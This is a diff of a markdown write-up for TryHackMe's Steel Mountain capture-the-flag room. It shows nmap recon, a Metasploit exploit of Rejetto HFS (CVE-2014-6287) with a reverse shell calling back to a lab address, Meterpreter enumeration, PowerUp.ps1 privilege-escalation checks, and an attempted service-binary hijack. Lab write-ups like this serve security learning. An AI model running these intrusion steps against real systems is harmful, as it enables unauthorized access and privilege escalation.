@@ -6,6 +6,8 @@ TryHackMe.com's Steel Mountain room.
 ## Recon
 
 ### NMAP Results
+
+```bash
 sudo nmap -Pn -sS -p- -oN nmap.initial -T5 10.10.90.201                                                   130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-16 16:42 EDT
@@ -30,6 +32,7 @@ PORT      STATE SERVICE
 49164/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 157.54 seconds
+```
 
 File server running on port 8080 is the Rejetto HttpFileServer (HFS). It is vulnerable to CVE-2014-6287 RCE. 
 Remote Desktop Protocol running on port 3389.
@@ -45,6 +48,7 @@ There is no need to start a listener as the default payload calls back to metasp
 
 ## Enumeration
 
+```bash
 meterpreter > sysinfo
 Computer        : STEELMOUNTAIN
 OS              : Windows 2012 R2 (6.3 Build 9600).
@@ -66,9 +70,11 @@ Name
 ----
 SeChangeNotifyPrivilege
 SeIncreaseWorkingSetPrivilege
+```
 
 We are looking for the user.txt flag. Listing the contents of the home directory didn't show it. I found it in the Desktop directory. 
 
+```bash
 meterpreter > dir
 Listing: C:\Users\bill\Desktop
 ==============================
@@ -79,9 +85,18 @@ Mode              Size  Type  Last modified              Name
 100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt
 
 cat user.txt for answer. b0[REDACTED]65
+```
 
 Additional enumeration done using the PowerUp.ps1 PowerShell script. 
+```bash
+meterpreter > upload PowerUp.ps1
+meterpreter > load powershell
+meterpreter > powershell_shell
 PS > . .\PowerUp.ps1
+```
+Note that the above command starts dot space. If you don't include that it will not work.
+
+```bash
 PS > Invoke-AllChecks
 
 [*] Running Invoke-AllChecks
@@ -138,9 +153,12 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerSh
 [*] Checking for unattended install files...
 [*] Checking for encrypted web.config strings...
 [*] Checking for encrypted application pool and virtual directory passwords...
-
+```
 
 ### MSF Attempt #5 
+The PowerUp.ps1 script should have noted a behavior called CanRestart. It didn't I tried restarting the script, restarting the target, restarting the room, using the attackbox, using the web Kali attack machine, and my own Kali VM. Nothing seemed to work. 
+
+```bash
 msf5 exploit(windows/http/rejetto_hfs_exec) > exploit
 
 [*] Started reverse TCP handler on 10.10.43.37:4444 
@@ -338,6 +356,7 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerSh
 [*] Checking for encrypted application pool and virtual directory passwords...
 
 ** END OF SCAN **
+```
 
 It seems that no matter how I try to run this script, I can't get it to show the `CanRestart` data. Then when I try to simply stop the service, replace the binary with my malicious script, and restart the service, it doesn't work. I am sure it is probably something to do with how PowerShell works. I must not be stopping the service so I can't access the file. More research into this is required. 
 
